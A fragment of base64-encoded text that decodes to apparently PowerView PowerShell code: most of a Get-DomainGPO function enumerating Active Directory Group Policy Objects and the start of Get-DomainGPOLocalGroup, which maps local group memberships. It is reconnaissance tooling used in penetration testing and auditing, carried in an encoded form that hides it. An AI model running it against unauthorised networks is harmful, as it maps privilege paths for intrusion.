tBbGlhcygnQ29tcHV0ZXJOYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlcklkZW50aXR5LAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnVXNlcklkZW50aXR5JyldCiAgICAgICAgW0FsaWFzKCdVc2VyTmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlcklkZW50aXR5LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnQURTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2UsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWN1cml0eU1hc2tzLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtBbGlhcygnUmV0dXJuT25lJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRmluZE9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRSYXcKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlY3VyaXR5TWFza3MnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlY3VyaXR5TWFza3MnXSA9ICRTZWN1cml0eU1hc2tzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRHUE9TZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJEdQT1NlYXJjaGVyKSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVySWRlbnRpdHknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VySWRlbnRpdHknXSkgewogICAgICAgICAgICAgICAgJEdQT0Fkc1BhdGhzID0gQCgpCiAgICAgICAgICAgICAgICBpZiAoJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10pIHsKICAgICAgICAgICAgICAgICAgICAkT2xkUHJvcGVydGllcyA9ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICdkaXN0aW5ndWlzaGVkbmFtZSxkbnNob3N0bmFtZScKICAgICAgICAgICAgICAgICRUYXJnZXRDb21wdXRlck5hbWUgPSAkTnVsbAoKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVySWRlbnRpdHknXSkgewogICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRDb21wdXRlcklkZW50aXR5CiAgICAgICAgICAgICAgICAgICAgJENvbXB1dGVyID0gR2V0LURvbWFpbkNvbXB1dGVyIEBTZWFyY2hlckFyZ3VtZW50cyAtRmluZE9uZSB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEKICAgICAgICAgICAgICAgICAgICBpZigtbm90ICRDb21wdXRlcikgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdQT10gQ29tcHV0ZXIgJyRDb21wdXRlcklkZW50aXR5JyBub3QgZm91bmQhIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkT2JqZWN0RE4gPSAkQ29tcHV0ZXIuZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXJOYW1lID0gJENvbXB1dGVyLmRuc2hvc3RuYW1lCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkVXNlcklkZW50aXR5CiAgICAgICAgICAgICAgICAgICAgJFVzZXIgPSBHZXQtRG9tYWluVXNlciBAU2VhcmNoZXJBcmd1bWVudHMgLUZpbmRPbmUgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxCiAgICAgICAgICAgICAgICAgICAgaWYoLW5vdCAkVXNlcikgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdQT10gVXNlciAnJFVzZXJJZGVudGl0eScgbm90IGZvdW5kISIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdEROID0gJFVzZXIuZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAjIGV4dHJhY3QgYWxsIE9VcyB0aGUgdGFyZ2V0IHVzZXIvY29tcHV0ZXIgaXMgYSBwYXJ0IG9mCiAgICAgICAgICAgICAgICAkT2JqZWN0T1VzID0gQCgpCiAgICAgICAgICAgICAgICAkT2JqZWN0T1VzICs9ICRPYmplY3RETi5zcGxpdCgnLCcpIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgIGlmKCRfLnN0YXJ0c3dpdGgoJ09VPScpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRPYmplY3RETi5TdWJTdHJpbmcoJE9iamVjdEROLkluZGV4T2YoJF8pKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1BPXSBvYmplY3QgT1VzOiAkT2JqZWN0T1VzIgoKICAgICAgICAgICAgICAgIGlmICgkT2JqZWN0T1VzKSB7CiAgICAgICAgICAgICAgICAgICAgIyBmaW5kIGFsbCB0aGUgR1BPcyBsaW5rZWQgdG8gdGhlIHVzZXIvY29tcHV0ZXIncyBPVXMKICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMuUmVtb3ZlKCdQcm9wZXJ0aWVzJykKICAgICAgICAgICAgICAgICAgICAkSW5oZXJpdGFuY2VEaXNhYmxlZCA9ICRGYWxzZQogICAgICAgICAgICAgICAgICAgIEZvckVhY2goJE9iamVjdE9VIGluICRPYmplY3RPVXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRJbmhlcml0YW5jZURpc2FibGVkKSB7IGJyZWFrIH0KICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJE9iamVjdE9VCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9BZHNQYXRocyArPSBHZXQtRG9tYWluT1UgQFNlYXJjaGVyQXJndW1lbnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBleHRyYWN0IGFueSBHUE8gbGlua3MgZm9yIHRoaXMgcGFydGljdWxhciBPVSB0aGUgY29tcHV0ZXIgaXMgYSBwYXJ0IG9mCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5ncGxpbmsuc3BsaXQoJ11bJykgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfLnN0YXJ0c3dpdGgoJ0xEQVAnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5zcGxpdCgnOycpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgdGhpcyBPVSBoYXMgR1BPIGluaGVyaXRlbmNlIGRpc2FibGVkLCBicmVhayBzbyBhZGRpdGlvbmFsIE9VcyBhcmVuJ3QgcHJvY2Vzc2VkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJF8uZ3BvcHRpb25zIC1lcSAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEluaGVyaXRhbmNlRGlzYWJsZWQgPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkVGFyZ2V0Q29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgIyBmaW5kIGFsbCB0aGUgR1BPcyBsaW5rZWQgdG8gdGhlIGNvbXB1dGVyJ3Mgc2l0ZQogICAgICAgICAgICAgICAgICAgICRDb21wdXRlclNpdGUgPSAoR2V0LU5ldENvbXB1dGVyU2l0ZU5hbWUgLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXJOYW1lKS5TaXRlTmFtZQogICAgICAgICAgICAgICAgICAgIGlmKCRDb21wdXRlclNpdGUgLWFuZCAoJENvbXB1dGVyU2l0ZSAtbm90bGlrZSAnRXJyb3IqJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJENvbXB1dGVyU2l0ZQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPQWRzUGF0aHMgKz0gR2V0LURvbWFpblNpdGUgQFNlYXJjaGVyQXJndW1lbnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJF8uZ3BsaW5rKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBleHRyYWN0IGFueSBHUE8gbGlua3MgZm9yIHRoaXMgcGFydGljdWxhciBzaXRlIHRoZSBjb21wdXRlciBpcyBhIHBhcnQgb2YKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5ncGxpbmsuc3BsaXQoJ11bJykgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5zdGFydHN3aXRoKCdMREFQJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfLnNwbGl0KCc7JylbMF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAjIGZpbmQgYW55IEdQT3MgbGlua2VkIHRvIHRoZSB1c2VyL2NvbXB1dGVyJ3MgZG9tYWluCiAgICAgICAgICAgICAgICAkT2JqZWN0RG9tYWluRE4gPSAkT2JqZWN0RE4uU3ViU3RyaW5nKCRPYmplY3RETi5JbmRleE9mKCdEQz0nKSkKICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50cy5SZW1vdmUoJ0lkZW50aXR5JykKICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50cy5SZW1vdmUoJ1Byb3BlcnRpZXMnKQogICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAiKG9iamVjdGNsYXNzPWRvbWFpbikoZGlzdGluZ3Vpc2hlZG5hbWU9JE9iamVjdERvbWFpbkROKSIKICAgICAgICAgICAgICAgICRHUE9BZHNQYXRocyArPSBHZXQtRG9tYWluT2JqZWN0IEBTZWFyY2hlckFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICBpZigkXy5ncGxpbmspIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBleHRyYWN0IGFueSBHUE8gbGlua3MgZm9yIHRoaXMgcGFydGljdWxhciBkb21haW4gdGhlIGNvbXB1dGVyIGlzIGEgcGFydCBvZgogICAgICAgICAgICAgICAgICAgICAgICAkXy5ncGxpbmsuc3BsaXQoJ11bJykgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJF8uc3RhcnRzd2l0aCgnTERBUCcpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8uc3BsaXQoJzsnKVswXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HUE9dIEdQT0Fkc1BhdGhzOiAkR1BPQWRzUGF0aHMiCgogICAgICAgICAgICAgICAgIyByZXN0b3JlIHRoZSBvbGQgcHJvcGVyaXRlcyB0byByZXR1cm4sIGlmIHNldAogICAgICAgICAgICAgICAgaWYgKCRPbGRQcm9wZXJ0aWVzKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJE9sZFByb3BlcnRpZXMgfQogICAgICAgICAgICAgICAgZWxzZSB7ICRTZWFyY2hlckFyZ3VtZW50cy5SZW1vdmUoJ1Byb3BlcnRpZXMnKSB9CiAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMuUmVtb3ZlKCdJZGVudGl0eScpCgogICAgICAgICAgICAgICAgJEdQT0Fkc1BhdGhzIHwgV2hlcmUtT2JqZWN0IHskXyAtYW5kICgkXyAtbmUgJycpfSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAjIHVzZSB0aGUgZ3BsaW5rIGFzIGFuIEFEUyBwYXRoIHRvIGVudW1lcmF0ZSBhbGwgR1BPcyBmb3IgdGhlIGNvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkXwogICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gIihvYmplY3RDYXRlZ29yeT1ncm91cFBvbGljeUNvbnRhaW5lcikiCiAgICAgICAgICAgICAgICAgICAgR2V0LURvbWFpbk9iamVjdCBAU2VhcmNoZXJBcmd1bWVudHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JhdyddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR1BPLlJhdycpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR1BPJykKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkXwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICAgICAkRmlsdGVyID0gJycKICAgICAgICAgICAgICAgICRJZGVudGl0eSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8uUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICAgICAgaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnTERBUDovL3xeQ049LionKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ3suKn0nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHdWlkQnl0ZVN0cmluZyA9ICgtSm9pbiAoKFtHdWlkXSRJZGVudGl0eUluc3RhbmNlKS5Ub0J5dGVBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyRfLlRvU3RyaW5nKCdYJykuUGFkTGVmdCgyLCcwJyl9KSkgLVJlcGxhY2UgJyguLiknLCdcJDEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RndWlkPSRHdWlkQnl0ZVN0cmluZykiCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzcGxheW5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRJZGVudGl0eUZpbHRlciAtYW5kICgkSWRlbnRpdHlGaWx0ZXIuVHJpbSgpIC1uZSAnJykgKSB7CiAgICAgICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHwkSWRlbnRpdHlGaWx0ZXIpIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1BPXSBVc2luZyBhZGRpdGlvbmFsIExEQVAgZmlsdGVyOiAkTERBUEZpbHRlciIKICAgICAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIkTERBUEZpbHRlciIKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkR1BPU2VhcmNoZXIuZmlsdGVyID0gIigmKG9iamVjdENhdGVnb3J5PWdyb3VwUG9saWN5Q29udGFpbmVyKSRGaWx0ZXIpIgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HUE9dIGZpbHRlciBzdHJpbmc6ICQoJEdQT1NlYXJjaGVyLmZpbHRlcikiCgogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRmluZE9uZSddKSB7ICRSZXN1bHRzID0gJEdQT1NlYXJjaGVyLkZpbmRPbmUoKSB9CiAgICAgICAgICAgICAgICBlbHNlIHsgJFJlc3VsdHMgPSAkR1BPU2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmF3J10pIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyByZXR1cm4gcmF3IHJlc3VsdCBvYmplY3RzCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE8gPSAkXwogICAgICAgICAgICAgICAgICAgICAgICAkR1BPLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5HUE8uUmF3JykKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSAtYW5kICgkU2VhcmNoQmFzZSAtTWF0Y2ggJ15HQzovLycpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR1BPID0gQ29udmVydC1MREFQUHJvcGVydHkgLVByb3BlcnRpZXMgJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR1BPRE4gPSAkR1BPLmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0RvbWFpbiA9ICRHUE9ETi5TdWJTdHJpbmcoJEdQT0ROLkluZGV4T2YoJ0RDPScpKSAtcmVwbGFjZSAnREM9JywnJyAtcmVwbGFjZSAnLCcsJy4nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGdwY2ZpbGVzeXNwYXRoID0gIlxcJEdQT0RvbWFpblxTeXNWb2xcJEdQT0RvbWFpblxQb2xpY2llc1wkKCRHUE8uY24pIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHUE8gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnZ3BjZmlsZXN5c3BhdGgnICRncGNmaWxlc3lzcGF0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1BPXSBFcnJvciBjYWxjdWxhdGluZyBncGNmaWxlc3lzcGF0aCBmb3I6ICQoJEdQTy5kaXN0aW5ndWlzaGVkbmFtZSkiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR1BPID0gQ29udmVydC1MREFQUHJvcGVydHkgLVByb3BlcnRpZXMgJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRHUE8uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkdQTycpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRHUE8KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgICAgIHRyeSB7ICRSZXN1bHRzLmRpc3Bvc2UoKSB9CiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdQT10gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJEdQT1NlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpbkdQT0xvY2FsR3JvdXAgewo8IwouU1lOT1BTSVMKClJldHVybnMgYWxsIEdQT3MgaW4gYSBkb21haW4gdGhhdCBtb2RpZnkgbG9jYWwgZ3JvdXAgbWVtYmVyc2hpcHMgdGhyb3VnaCAnUmVzdHJpY3RlZCBHcm91cHMnCm9yIEdyb3VwIFBvbGljeSBwcmVmZXJlbmNlcy4gQWxzbyByZXR1cm4gdGhlaXIgdXNlciBtZW1iZXJzaGlwIG1hcHBpbmdzLCBpZiB0aGV5IGV4aXN0LgoKQXV0aG9yOiBAaGFybWoweSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpbkdQTywgR2V0LUdwdFRtcGwsIEdldC1Hcm91cHNYTUwsIENvbnZlcnRUby1TSUQsIENvbnZlcnRGcm9tLVNJRCAgCgouREVTQ1JJUFRJT04KCkZpcnN0IGVudW1lcmF0ZXMgYWxsIEdQT3MgaW4gdGhlIGN1cnJlbnQvdGFyZ2V0IGRvbWFpbiB1c2luZyBHZXQtRG9tYWluR1BPIHdpdGggcGFzc2VkCmFyZ3VtZW50cywgYW5kIGZvciBlYWNoIEdQTyBjaGVja3MgaWYgJ1Jlc3RyaWN0ZWQgR3JvdXBzJyBhcmUgc2V0IHdpdGggR3B0VG1wbC5pbmYgb3IKZ3JvdXAgbWVtYmVyc2hpcCBpcyBzZXQgdGhyb3VnaCBHcm91cCBQb2xpY3kgUHJlZmVyZW5jZXMgZ3JvdXBzLnhtbCBmaWxlcy4gRm9yIGFueQpHcHRUbXBsLmluZiBmaWxlcyBmb3VuZCwgdGhlIGZpbGUgaXMgcGFyc2VkIHdpdGggR2V0LUdwdFRtcGwgYW5kIGFueSAnR3JvdXAgTWVtYmVyc